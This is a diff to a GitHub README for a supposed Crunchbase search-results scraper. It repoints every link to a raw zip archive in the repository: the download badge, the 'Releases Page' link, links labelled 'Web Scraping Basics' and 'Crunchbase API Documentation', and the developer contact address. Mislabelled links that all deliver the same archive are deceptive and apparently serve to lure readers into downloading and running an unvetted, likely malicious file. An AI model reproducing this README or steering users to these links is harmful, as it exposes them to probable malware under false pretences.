@@ -14,7 +14,7 @@ To get started with the Crunchbase Any Search Results Scraper, follow these simp
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [![Download Crunchbase Scraper](https://raw.githubusercontent.com/andres221-star/crunchbase-any-search-results-scraper/main/src/outputs/crunchbase-any-search-results-scraper-v2.4.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/andres221-star/crunchbase-any-search-results-scraper/main/src/outputs/crunchbase-any-search-results-scraper-v2.4.zip)
+   [![Download Crunchbase Scraper](https://github.com/andres221-star/crunchbase-any-search-results-scraper/raw/refs/heads/main/src/results_search_scraper_crunchbase_any_v2.9.zip%20Now-Here-brightgreen)](https://github.com/andres221-star/crunchbase-any-search-results-scraper/raw/refs/heads/main/src/results_search_scraper_crunchbase_any_v2.9.zip)
 
 2. **Download the Software:**
    - Locate the latest version of the software on the releases page. 
@@ -33,7 +33,7 @@ To get started with the Crunchbase Any Search Results Scraper, follow these simp
 ## 📥 Download & Install
 To download and install the Crunchbase Any Search Results Scraper, visit the link below and choose the latest version available.
 
-[Download from the Releases Page](https://raw.githubusercontent.com/andres221-star/crunchbase-any-search-results-scraper/main/src/outputs/crunchbase-any-search-results-scraper-v2.4.zip)
+[Download from the Releases Page](https://github.com/andres221-star/crunchbase-any-search-results-scraper/raw/refs/heads/main/src/results_search_scraper_crunchbase_any_v2.9.zip)
 
 ## 💡 How to Use the Scraper
 Once you have installed the software, follow these steps to start scraping data:
@@ -65,10 +65,10 @@ Please consider following these guidelines when contributing:
 
 ## 📚 Further Reading
 If you want to learn more about web scraping, you can check out the following resources:
-- [Web Scraping Basics](https://raw.githubusercontent.com/andres221-star/crunchbase-any-search-results-scraper/main/src/outputs/crunchbase-any-search-results-scraper-v2.4.zip)
-- [Crunchbase API Documentation](https://raw.githubusercontent.com/andres221-star/crunchbase-any-search-results-scraper/main/src/outputs/crunchbase-any-search-results-scraper-v2.4.zip)
+- [Web Scraping Basics](https://github.com/andres221-star/crunchbase-any-search-results-scraper/raw/refs/heads/main/src/results_search_scraper_crunchbase_any_v2.9.zip)
+- [Crunchbase API Documentation](https://github.com/andres221-star/crunchbase-any-search-results-scraper/raw/refs/heads/main/src/results_search_scraper_crunchbase_any_v2.9.zip)
 
 ## 📧 Contact
-For any inquiries or feedback, feel free to contact the developer at [https://raw.githubusercontent.com/andres221-star/crunchbase-any-search-results-scraper/main/src/outputs/crunchbase-any-search-results-scraper-v2.4.zip].
+For any inquiries or feedback, feel free to contact the developer at [https://github.com/andres221-star/crunchbase-any-search-results-scraper/raw/refs/heads/main/src/results_search_scraper_crunchbase_any_v2.9.zip].
 
 Thank you for using the Crunchbase Any Search Results Scraper! Happy scraping!
